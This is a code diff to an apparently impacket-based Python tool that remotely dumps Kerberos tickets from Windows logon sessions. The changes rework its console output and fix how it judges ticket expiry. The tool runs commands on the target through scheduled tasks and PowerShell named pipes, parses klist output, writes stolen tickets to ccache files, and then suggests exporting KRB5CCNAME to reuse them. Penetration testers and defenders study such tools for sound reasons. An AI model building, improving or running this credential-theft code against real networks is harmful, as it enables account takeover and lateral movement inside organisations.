@@ -38,6 +38,71 @@ from impacket.dcerpc.v5.rpcrt import (
 )
 
 
+# ─── output ───────────────────────────────────────────────────────────────────
+# Every line is "[*] ok/info" or "[X] absent/failed", no colors.
+
+OK, BAD = "[*]", "[X]"
+_LABEL_WIDTH = 22
+
+
+class MarkerFormatter(logging.Formatter):
+    """Force impacket's log bullets ([*]/[+]/[!]/[-]) into just [*] and [X]."""
+
+    def __init__(self, ts=False):
+        fmt = "%(marker)s %(asctime)s %(message)s" if ts else "%(marker)s %(message)s"
+        super().__init__(fmt, "%Y-%m-%d %H:%M:%S")
+
+    def format(self, record):
+        record.marker = BAD if record.levelno >= logging.WARNING else OK
+        return super().format(record)
+
+
+def init_logging(ts=False, debug=False):
+    logger.init(ts)
+    for handler in logging.getLogger().handlers:
+        handler.setFormatter(MarkerFormatter(ts))
+    logging.getLogger().setLevel(logging.DEBUG if debug else logging.INFO)
+
+
+def say(text, ok=True):
+    """One marked output line (stdout, not the log stream)."""
+    print("%s %s" % (OK if ok else BAD, text))
+
+
+def kv(label, value, ok=True, indent=0):
+    """One marked, dot-aligned 'label ... value' line."""
+    pad = "  " * indent
+    say("%s %s" % ((pad + label + " ").ljust(_LABEL_WIDTH, "."), value), ok)
+
+
+def item(text, indent=1):
+    """One unmarked list row, aligned under the marked lines around it."""
+    print("%s%s%s" % (" " * (len(OK) + 1), "  " * indent, text))
+
+
+def fmt_ticket_time(ts):
+    """Render a parsed klist timestamp for display.
+
+    _parse_klist tags klist's "(local)" wallclock as UTC, so rendering it back
+    in UTC reproduces the wallclock the target itself reported.
+    """
+    if not ts:
+        return "N/A"
+    return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+
+
+def now_ticket_frame():
+    """"Now" in the same frame as _parse_klist's parse_time().
+
+    parse_time() tags the target's local wallclock as UTC, so its values are not
+    true epochs. Comparing them against time.time() skews every result by the
+    UTC offset, which silently drops still-valid tickets west of UTC and keeps
+    expired ones east of it. Build "now" the same way instead: naive local
+    wallclock tagged UTC. Assumes operator and target share a timezone.
+    """
+    return datetime.now().replace(tzinfo=timezone.utc).timestamp()
+
+
 # ─── klist text parser ────────────────────────────────────────────────────────
 
 def _parse_klist(text):
@@ -430,7 +495,7 @@ def run_remote_cmd_and_read_output(smb, dce, command, max_wait=60, retries=20, p
     Returns decoded string content, or None on failure.
     """
     task_name, task_author, task_desc, temp_basename = _leet_names(product=product)
-    logging.info("  task: \\%s  file: %s" % (task_name, temp_basename))
+    logging.info("task: \\%s  file: %s" % (task_name, temp_basename))
 
     args = '/c "' + command + ' > C:\\ProgramData\\' + temp_basename + '"'
     xml = _task_xml(task_author, task_desc, "cmd.exe", args, time_limit="PT1M")
@@ -504,7 +569,7 @@ def _run_ps_via_pipe(smb, dce, ps_body, max_wait=90, pipe_timeout=45):
     Returns raw output string (before EOF sentinel), or None on failure.
     """
     task_name, task_author, task_desc, pipe_name = _leet_names(use_pipes=True)
-    logging.info("  task: \\%s  pipe: \\pipe\\%s" % (task_name, pipe_name))
+    logging.info("task: \\%s  pipe: \\pipe\\%s" % (task_name, pipe_name))
 
     ps_cmd = (
         "$n='{pipe}';"
@@ -791,11 +856,12 @@ def cmd_list(args):
         sys.exit(0)
 
     print()
-    print("  Kerberos sessions on %s:\n" % address)
+    kv("Kerberos sessions", len(sessions), ok=bool(sessions))
     w = max(len(a) for _, a in sessions)
     for i, (logon_hex, account) in enumerate(sessions, 1):
-        print("  [%d]  %-*s  %s" % (i, w, account, logon_hex))
+        item("[%d] %-*s  %s" % (i, w, account, logon_hex))
     print()
+    say("Dump one with: -s N   (omit -s to dump all)")
 
 
 def cmd_dump(args):
@@ -876,10 +942,9 @@ def cmd_dump(args):
 
     w = max(len(a) for _, a in to_dump)
     print()
-    print("  Sessions to dump:\n")
+    kv("Sessions to dump", len(to_dump))
     for i, (logon_hex, account) in enumerate(to_dump, 1):
-        print("  [%d]  %-*s  %s" % (i, w, account, logon_hex))
-    print()
+        item("[%d] %-*s  %s" % (i, w, account, logon_hex))
 
     # ── Fetch TGT text(s) ────────────────────────────────────────────────────
     if args.named_pipes:
@@ -900,34 +965,41 @@ def cmd_dump(args):
 
     # ── Write ccache files ───────────────────────────────────────────────────
     written = []
+    expired = 0
     for i, ((logon_hex, account), tgt_text) in enumerate(zip(to_dump, tgt_texts), 1):
         print()
-        logging.info("[%d/%d] %s (%s) ..." % (i, len(to_dump), account, logon_hex))
+        say("[%d/%d] %s (%s)" % (i, len(to_dump), account, logon_hex))
         if not tgt_text:
-            logging.error("  No output for %s" % account)
+            kv("Result", "no output", ok=False, indent=1)
             continue
         info = _parse_klist(tgt_text)
         if not info["ticket_data"]:
-            logging.error("  No ticket data found for %s" % account)
+            kv("Result", "no ticket data found", ok=False, indent=1)
             continue
         if info.get("cred_guard"):
-            logging.error("  %s: session key is Credential Guard-protected (wrapped in VTL1); "
-                          "cannot export a usable ccache. Skipping." % account)
+            kv("Result", "Credential Guard-protected (VTL1) - cannot export",
+               ok=False, indent=1)
             continue
 
-        now = time.time()
+        now = now_ticket_frame()
+        end_time, renew_till = info["end_time"], info["renew_till"]
 
-        if info["end_time"]:
-            etime = datetime.fromtimestamp(info["end_time"]).isoformat()
-            logging.info("  EndTime: %s", etime)
+        kv("EndTime", fmt_ticket_time(end_time), indent=1)
+        if renew_till:
+            kv("RenewUntil", fmt_ticket_time(renew_till), indent=1)
 
-        if info["renew_till"]:
-            rtime = datetime.fromtimestamp(info["renew_till"]).isoformat()
-            logging.info("  Renew Until: %s", rtime)
-            if info["renew_till"] < now:          
-                logging.info("  Expired Ticket!")
+        # Expiry is decided by end_time. renew_till only earns a ticket a
+        # reprieve: past end_time but still renewable is worth writing, since
+        # the ccache can be renewed. A non-renewable ticket has renew_till == 0,
+        # which must not be mistaken for "no expiry information".
+        if end_time and end_time < now:
+            if renew_till and renew_till > now:
+                kv("Status", "expired, still renewable - writing", ok=False, indent=1)
+            else:
+                kv("Status", "expired - skipping", ok=False, indent=1)
+                expired += 1
                 continue
-              
+
         safe_name = re.sub(r"[^\w@.-]", "_", "%s@%s" % (info["client"], info["realm"]))
         out_path = os.path.join(args.output_dir, safe_name + ".ccache")
         if os.path.exists(out_path):
@@ -937,12 +1009,21 @@ def cmd_dump(args):
                 idx2 += 1
         _write_ccache(info, out_path)
         written.append(out_path)
-        logging.info("  -> %s" % out_path)
+        kv("Written", out_path, indent=1)
 
+    print()
     if written:
-        logging.info("Done. %d ccache(s) written to %s" % (len(written), args.output_dir))
+        kv("ccaches written", "%d -> %s" % (len(written), args.output_dir))
+        if expired:
+            kv("Skipped (expired)", expired, ok=False)
+        print()
+        say("Use with: export KRB5CCNAME=%s" % written[0])
     else:
-        logging.error("No ccache files written")
+        kv("ccaches written", "0", ok=False)
+        if expired:
+            kv("Skipped (expired)", expired, ok=False)
+            print()
+            say("Every ticket dumped was expired - nothing usable to write.", ok=False)
         sys.exit(1)
 
 
@@ -999,14 +1080,12 @@ def main():
     args = parser.parse_args()
 
     print(version.BANNER)
-    logger.init(args.ts)
-    if args.debug:
-        logging.getLogger().setLevel(logging.DEBUG)
+    init_logging(args.ts, args.debug)
 
     if getattr(args, "named_pipes", False):
-        logging.warning("This will work ONLY on Windows >= Vista with PowerShell 2.0+")
+        logging.info("Requires Windows >= Vista with PowerShell 2.0+ on the target")
     else:
-        logging.warning("This will work ONLY on Windows >= Vista")
+        logging.info("Requires Windows >= Vista on the target")
 
     if args.mode == "list":
         cmd_list(args)
